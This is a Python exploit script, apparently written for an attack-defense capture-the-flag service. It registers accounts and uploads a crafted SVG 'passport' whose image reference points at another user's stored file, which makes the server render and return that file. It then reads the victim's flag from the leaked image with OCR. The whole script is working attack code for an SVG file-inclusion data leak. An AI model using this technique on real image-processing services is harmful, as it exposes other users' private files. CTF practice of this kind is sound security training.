#!/bin/env python3

import sys

import requests
import pytesseract
import base64
import string
import random
from hashlib import sha256
from os import remove
from PIL import Image

empty_png_base64 = "iVBORw0KGgoAAAANSUhEUgAAAZAAAADICAIAAABJdyC1AAACqElEQVR4nO3UQQ0AIBDAMMC/58MCP7KkVbDX9swsgILzOwDglWEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWQYFpBhWECGYQEZhgVkGBaQYVhAhmEBGYYFZBgWkGFYQIZhARmGBWRcVTEEjWJIzVQAAAAASUVORK5CYII="
svg_template = """
<svg width="8000" height="400"
  xmlns="http://www.w3.org/2000/svg">
  <image href="data/{{sha256_username}}.png" width="160000" height="8000"/>
</svg>
"""

def gen_random_str(n, charset):
    return ''.join(random.choice(charset) for _ in range(n))


def exploit(ip, port, flag_id):
    baseurl=f"http://{ip}:{port}"

    username = gen_random_str(12, string.ascii_uppercase + string.digits + string.ascii_lowercase)
    password = gen_random_str(12, string.ascii_uppercase + string.digits + string.ascii_lowercase)
    response = requests.post(f"{baseurl}/auth/register", json={"username": username, "hashedPassword": password, "passport": empty_png_base64})
    if response.status_code != 200:
        print("Error when registering first")
        print(response.text)
        exit(-1)
    
    response = requests.post(f"{baseurl}/auth/login", json={"username": username, "hashedPassword": password})
    if response.status_code != 200:
        print("Error when logging in first")
        print(response.text)
        exit(-1)

    token = response.json()['token']

    response = requests.get(f"{baseurl}/profile/{flag_id}")
    if response.status_code != 200:
        print("Error when getting the profile")
        print(response.text)
        exit(-1)

    username = response.json()['username']
    hashed_username = sha256(username.encode('utf-8')).hexdigest()
    svg = svg_template.replace('{{sha256_username}}', hashed_username)

    username = gen_random_str(12, string.ascii_uppercase + string.digits + string.ascii_lowercase)
    password = gen_random_str(12, string.ascii_uppercase + string.digits + string.ascii_lowercase)
    response = requests.post(f"{baseurl}/auth/register", json={"username": username, "hashedPassword": password, "passport": base64.b64encode(svg.encode()).decode()})
    if response.status_code != 200:
        print("Error when registering second")
        print(response.text)
        exit(-1)
    

    response = requests.post(f'{baseurl}/auth/login', json={"username": username, "hashedPassword": password})
    if response.status_code != 200:
        print("Error when logging in second")
        print(response.text)
        exit(-1)
    
    passport_png_base64 = response.json()['passport']
    passport_png = base64.b64decode(passport_png_base64)
    f = open("image.png", "wb+")
    f.write(passport_png)
    f.close()

    
    im = Image.open("image.png")
    print(im.info)

    print("Found the flag:", pytesseract.image_to_string("image.png").replace(" ",""))
    remove("image.png")


if __name__ == '__main__':
    if len(sys.argv) != 4:
        sys.stderr.write('Usage: ./exploit_lfi.py IP PORT FLAG_ID\n')
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
